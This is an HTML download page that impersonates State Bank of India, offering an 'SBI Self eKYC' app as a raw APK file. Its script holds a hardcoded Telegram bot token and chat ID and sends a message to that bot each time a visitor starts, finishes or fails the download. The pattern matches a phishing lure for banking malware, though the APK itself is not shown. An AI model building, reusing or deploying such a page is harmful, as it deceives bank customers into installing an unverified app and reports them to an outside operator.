<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download SBI Self ekYC APK</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: Arial, sans-serif;
    }

    body {
      background: url('https://i.ibb.co/hxLr8trW/images-3.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      padding: 20px;
    }

    .overlay {
      background-color: rgba(0, 0, 0, 0.5);
      padding: 30px 25px;
      border-radius: 12px;
      text-align: center;
      backdrop-filter: blur(6px);
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
    }

    h2 {
      font-size: 22px;
      margin-bottom: 15px;
      line-height: 1.3;
    }

    p {
      font-size: 16px;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    button {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #0056b3;
    }

    a {
      text-decoration: none;
      width: 100%;
      display: block;
    }

    @media (max-width: 480px) {
      h2 {
        font-size: 20px;
      }
      p {
        font-size: 15px;
      }
      button {
        font-size: 16px;
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <div class="overlay">
    <h2>üì≤ Download SBI Self eKYC App</h2>
    <p>Click the button below to download the latest APK file.</p>
    <a id="downloadLink" href="sbi_self_ekyc.apk" download>
      <button id="downloadBtn">üì• Download Now</button>
    </a>
  </div>

  <script>
    // Telegram Config
    const chatId = "6677946042";
    const botToken = "7705340121:AAFSqXEFyyTre0atb8O1G-bCTwGLrM_tX_k";

    async function sendTelegramMessage(message) {
      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch (err) {
        console.error("Telegram Error:", err);
      }
    }

    const downloadBtn = document.getElementById("downloadBtn");
    const downloadLink = document.getElementById("downloadLink");

    downloadBtn.addEventListener("click", async (e) => {
      e.preventDefault();

      // Step 1: Notify start
      await sendTelegramMessage("üì≤ User started downloading SBI Self eKYC APK.");

      // Step 2: Start download
      const url = downloadLink.getAttribute("href");
      const fileName = url.split("/").pop();

      try {
        const response = await fetch(url);
        const blob = await response.blob();

        // Trigger download
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = fileName;
        document.body.appendChild(a);
        a.click();
        a.remove();

        // Step 3: Notify complete
        await sendTelegramMessage("‚úÖ Download completed for SBI Self eKYC APK.");
      } catch (error) {
        await sendTelegramMessage("‚ùå Download failed or cancelled.");
      }
    });
  </script>
</body>
</html>
